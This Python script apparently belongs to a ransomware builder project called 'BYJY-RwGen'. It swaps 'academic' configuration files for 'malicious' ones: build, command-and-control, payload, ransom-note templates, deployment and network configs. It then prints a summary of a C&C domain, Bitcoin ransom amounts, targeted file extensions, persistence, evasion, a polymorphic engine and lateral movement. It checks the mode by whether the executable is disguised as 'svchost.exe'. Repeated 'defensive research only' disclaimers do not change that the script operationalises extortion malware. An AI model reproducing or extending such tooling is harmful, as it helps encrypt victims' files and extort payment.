#!/usr/bin/env python3
"""
Configuration Switcher - BYJY-RwGen
Switches from academic to malicious configurations for advanced defensive research
"""

import os
import sys
import shutil
import json
from pathlib import Path

class ConfigurationSwitcher:
    def __init__(self):
        self.project_root = Path(__file__).parent
        self.malicious_config_dir = self.project_root / "malicious_configs"
        self.academic_backup_dir = self.project_root / "academic_configs_backup"
        
    def backup_academic_configs(self):
        """Backup current academic configurations"""
        print("[+] Backing up academic configurations...")
        
        if not self.academic_backup_dir.exists():
            self.academic_backup_dir.mkdir()
        
        config_files = [
            "build_config.json",
            "c2_config.json", 
            "payload_config.json",
            "linux_build.conf"
        ]
        
        for config_file in config_files:
            src_path = self.project_root / config_file
            dst_path = self.academic_backup_dir / config_file
            
            if src_path.exists():
                shutil.copy2(src_path, dst_path)
                print(f"  ✓ Backed up {config_file}")
            else:
                print(f"  ⚠ Academic config not found: {config_file}")
    
    def switch_to_malicious(self):
        """Switch to malicious configurations"""
        print("[+] Switching to malicious configurations...")
        
        config_mappings = {
            "build_config.json": "malicious_configs/build_config.json",
            "c2_config.json": "malicious_configs/c2_config.json",
            "payload_config.json": "malicious_configs/payload_config.json", 
            "linux_build.conf": "malicious_configs/linux_build.conf"
        }
        
        for dest_file, src_file in config_mappings.items():
            src_path = self.project_root / src_file
            dst_path = self.project_root / dest_file
            
            if src_path.exists():
                shutil.copy2(src_path, dst_path)
                print(f"  ✓ Applied malicious config: {dest_file}")
            else:
                print(f"  ❌ Malicious config not found: {src_file}")
                return False
        
        return True
    
    def create_additional_malicious_configs(self):
        """Create additional configuration files needed for malicious mode"""
        print("[+] Creating additional malicious configuration files...")
        
        # Create malicious resources directory
        malicious_resources = self.project_root / "resources"
        malicious_resources.mkdir(exist_ok=True)
        
        # Copy malicious resources
        src_resources = self.malicious_config_dir / "resources_malicious" / "config.json"
        dst_resources = malicious_resources / "config.json"
        
        if src_resources.exists():
            shutil.copy2(src_resources, dst_resources)
            print(f"  ✓ Copied malicious resources config")
        
        # Copy ransom note templates
        ransom_templates_src = self.malicious_config_dir / "ransom_note_templates"
        ransom_templates_dst = self.project_root / "resources"
        
        if ransom_templates_src.exists():
            for template_file in ransom_templates_src.glob("*.txt"):
                dst_file = ransom_templates_dst / template_file.name
                shutil.copy2(template_file, dst_file)
                print(f"  ✓ Copied ransom template: {template_file.name}")
        
        # Create deployment and network configs in root
        additional_configs = [
            "deployment_config.json",
            "network_config.json"
        ]
        
        for config in additional_configs:
            src_path = self.malicious_config_dir / config
            dst_path = self.project_root / config
            
            if src_path.exists():
                shutil.copy2(src_path, dst_path)
                print(f"  ✓ Created {config}")
    
    def verify_malicious_configuration(self):
        """Verify that malicious configurations are properly applied"""
        print("[+] Verifying malicious configuration...")
        
        required_files = [
            "build_config.json",
            "c2_config.json",
            "payload_config.json",
            "linux_build.conf",
            "resources/config.json",
            "deployment_config.json",
            "network_config.json"
        ]
        
        all_present = True
        for config_file in required_files:
            file_path = self.project_root / config_file
            if file_path.exists():
                print(f"  ✓ {config_file}")
            else:
                print(f"  ❌ Missing: {config_file}")
                all_present = False
        
        if all_present:
            print("[+] ✅ All malicious configurations successfully applied!")
            return True
        else:
            print("[-] ❌ Some configurations are missing!")
            return False
    
    def display_malicious_config_summary(self):
        """Display summary of malicious configuration parameters"""
        print("\n" + "="*70)
        print("MALICIOUS CONFIGURATION SUMMARY - ADVANCED DEFENSIVE RESEARCH")
        print("="*70)
        
        try:
            # Load and display key malicious parameters
            with open(self.project_root / "build_config.json", 'r') as f:
                build_config = json.load(f)
            
            with open(self.project_root / "c2_config.json", 'r') as f:
                c2_config = json.load(f)
            
            with open(self.project_root / "payload_config.json", 'r') as f:
                payload_config = json.load(f)
            
            print(f"🎯 TARGET EXECUTABLE: {build_config['main_executable']}")
            print(f"🔒 OBFUSCATION LEVEL: {build_config['obfuscation_level']}")
            print(f"📁 TARGET EXTENSIONS: {len(build_config['target_extensions'])} types")
            print(f"🌐 C&C DOMAIN: {c2_config['c2_domain']}")
            print(f"💰 BASE PAYMENT: {c2_config['ransom_note']['payment_amounts']['enterprise']} BTC")
            print(f"⚡ ENCRYPTION THREADS: {payload_config['encryption']['threads']}")
            print(f"🛡️ PERSISTENCE METHODS: {len(payload_config['persistence']['methods'])}")
            print(f"📊 CAMPAIGN: {c2_config['campaign_tracking']['campaign_id']}")
            
            print("\n⚠️ ADVANCED EVASION FEATURES:")
            if build_config.get('advanced_evasion', {}).get('syscall_obfuscation'):
                print("  ✓ Syscall obfuscation enabled")
            if build_config.get('polymorphic_engine'):
                print("  ✓ Polymorphic engine active")
            if payload_config.get('anti_analysis', {}).get('process_monitoring'):
                print("  ✓ Process monitoring evasion")
            if payload_config.get('lateral_movement', {}).get('enabled'):
                print("  ✓ Lateral movement capabilities")
                
            print("\n🎓 FOR DEFENSIVE RESEARCH PURPOSES ONLY")
            print("This configuration simulates real-world ransomware tactics")
            print("for developing and testing cybersecurity defenses.")
            
        except Exception as e:
            print(f"Error reading configuration summary: {e}")
        
        print("="*70 + "\n")
    
    def restore_academic_configs(self):
        """Restore academic configurations from backup"""
        print("[+] Restoring academic configurations...")
        
        if not self.academic_backup_dir.exists():
            print("[-] No academic backup found!")
            return False
        
        config_files = [
            "build_config.json",
            "c2_config.json",
            "payload_config.json", 
            "linux_build.conf"
        ]
        
        for config_file in config_files:
            src_path = self.academic_backup_dir / config_file
            dst_path = self.project_root / config_file
            
            if src_path.exists():
                shutil.copy2(src_path, dst_path)
                print(f"  ✓ Restored {config_file}")
            else:
                print(f"  ⚠ Backup not found: {config_file}")
        
        print("[+] Academic configurations restored!")
        return True

def main():
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python3 switch_to_malicious_config.py malicious  # Switch to malicious configs")
        print("  python3 switch_to_malicious_config.py academic   # Restore academic configs")
        print("  python3 switch_to_malicious_config.py status     # Show current config")
        return
    
    switcher = ConfigurationSwitcher()
    command = sys.argv[1].lower()
    
    if command == "malicious":
        print("🔴 SWITCHING TO MALICIOUS CONFIGURATIONS")
        print("⚠️ FOR ADVANCED DEFENSIVE RESEARCH ONLY ⚠️\n")
        
        # Backup academic configs first
        switcher.backup_academic_configs()
        
        # Switch to malicious
        if switcher.switch_to_malicious():
            switcher.create_additional_malicious_configs()
            if switcher.verify_malicious_configuration():
                switcher.display_malicious_config_summary()
                print("✅ Successfully switched to malicious configurations!")
                print("🛡️ Ready for advanced defensive research and testing.")
            else:
                print("❌ Configuration switch failed!")
        else:
            print("❌ Failed to switch configurations!")
    
    elif command == "academic":
        print("🔵 RESTORING ACADEMIC CONFIGURATIONS")
        print("🎓 Switching back to safe research mode\n")
        
        switcher.restore_academic_configs()
        print("✅ Successfully restored academic configurations!")
    
    elif command == "status":
        # Check current config type
        try:
            with open(Path(__file__).parent / "build_config.json", 'r') as f:
                config = json.load(f)
                
            if config.get("main_executable") == "svchost.exe":
                print("🔴 CURRENT MODE: Malicious Configuration")
                print("⚠️ Advanced research mode active")
            else:
                print("🔵 CURRENT MODE: Academic Configuration")  
                print("🎓 Safe research mode active")
                
        except FileNotFoundError:
            print("❓ No configuration found")
    
    else:
        print("Invalid command. Use 'malicious', 'academic', or 'status'")

if __name__ == "__main__":
    main()